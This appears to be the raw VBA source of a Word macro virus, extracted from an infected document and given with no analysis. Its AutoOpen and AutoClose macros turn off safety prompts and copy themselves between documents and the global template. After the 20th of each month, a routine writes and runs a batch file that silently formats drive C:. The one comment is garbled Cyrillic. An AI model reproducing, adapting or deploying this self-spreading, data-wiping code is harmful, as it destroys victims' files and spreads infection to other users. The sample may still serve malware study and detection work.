   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Dim fn$
   Public Sub MAIN()
   fn$ = ""
   WordBasic.DisableAutoMacros 0                     'Enables auto macro
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0  'disbled prompt saving normal
   fn$ = WordBasic.[FileName$]()
   If Cins = 0 Then
           'delAll
           infect
   End If
   If WordBasic.Day(WordBasic.Now()) > 20 Then
     Form_
   End If
   End Sub

   Private Function Cins()
   Dim i
   Cins = 0
   If WordBasic.CountMacros(1) <> 0 Then
   For i = 1 To WordBasic.CountMacros(1)
           If WordBasic.[MacroName$](i, 1) = "Form" Then
                   Cins = 1
           End If
   Next i
   End If
   End Function

   Private Sub infect()
      WordBasic.MacroCopy "Global:" + "AutoOpen", fn$ + ":" + "AutoOpen"
      WordBasic.MacroCopy "Global:" + "AutoClose", fn$ + ":" + "AutoClose"
      WordBasic.MacroCopy "Global:" + "Form", fn$ + ":" + "Form"
      WordBasic.FileSaveAs Format:=1
   End Sub

   Private Sub Form_()
   Open "c:\w.bat" For Output As 1
   Print #1, "echo y | format c: /u"
   Close 1
   WordBasic.Shell "c:\w.bat"
   End Sub

   Attribute VB_Name = "AutoOpen"

   Dim fn$
   Public Sub MAIN()
   fn$ = ""
   WordBasic.DisableAutoMacros 0                     'Enables auto macro
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0  'disbled prompt saving normal
   fn$ = WordBasic.[FileName$]()
   If Cins = 0 Then
           'delAll
           infect
   End If
   If WordBasic.Day(WordBasic.Now()) > 20 Then
     Form_
   End If
   End Sub

   Private Function Cins()
   Dim i
   Cins = 0
   If WordBasic.CountMacros(0) <> 0 Then
   For i = 1 To WordBasic.CountMacros(0)
           If WordBasic.[MacroName$](i, 0) = "Form" Then
                   Cins = 1
           End If
   Next i
   End If
   End Function

   Private Sub infect()
      WordBasic.MacroCopy fn$ + ":" + "AutoOpen", "Global:" + "AutoOpen"
      WordBasic.MacroCopy fn$ + ":" + "AutoClose", "Global:" + "AutoClose"
      WordBasic.MacroCopy fn$ + ":" + "Form", "Global:" + "Form"
   End Sub

   Private Sub Form_()
   Open "c:\w.bat" For Output As 1
   Print #1, "echo y | format c: /u"
   Close 1
   WordBasic.Shell "c:\w.bat"
   End Sub

   Attribute VB_Name = "Form_"

   Public Sub MAIN()
   '----------------------
   ' Ñïåöèàëüíî äëÿ Ãóððå
   '----------------------
   End Sub
